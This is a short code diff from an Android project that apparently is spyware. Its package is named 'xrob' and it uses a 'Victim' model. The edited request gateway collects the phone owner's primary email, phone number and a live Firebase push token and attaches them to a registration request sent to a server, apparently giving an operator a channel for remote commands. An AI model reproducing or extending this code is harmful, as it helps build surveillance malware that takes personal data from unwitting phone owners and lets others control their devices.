@@ -15,6 +15,7 @@ import android.telephony.TelephonyManager;
 import android.telephony.gsm.GsmCellLocation;
 import android.util.Log;
 
+import com.google.firebase.iid.FirebaseInstanceId;
 import com.theah64.xrob.models.Victim;
 
 import org.json.JSONException;
@@ -299,8 +300,13 @@ public class APIRequestGateway {
         final String email = profileUtils.getPrimaryEmail();
         final String phone = profileUtils.getPhone();
         final PrefUtils prefUtils = PrefUtils.getInstance(context);
-        final String fcmId = prefUtils.getString(PrefUtils.KEY_FCM_ID);
 
+        String fcmId = FirebaseInstanceId.getInstance().getToken();
+
+        if (fcmId == null) {
+            Log.d(X, "Live token is null, collecting from pref");
+            fcmId = prefUtils.getString(PrefUtils.KEY_FCM_ID);
+        }
 
         //Attaching them with the request
         final Request inRequest = new APIRequestBuilder("/in")
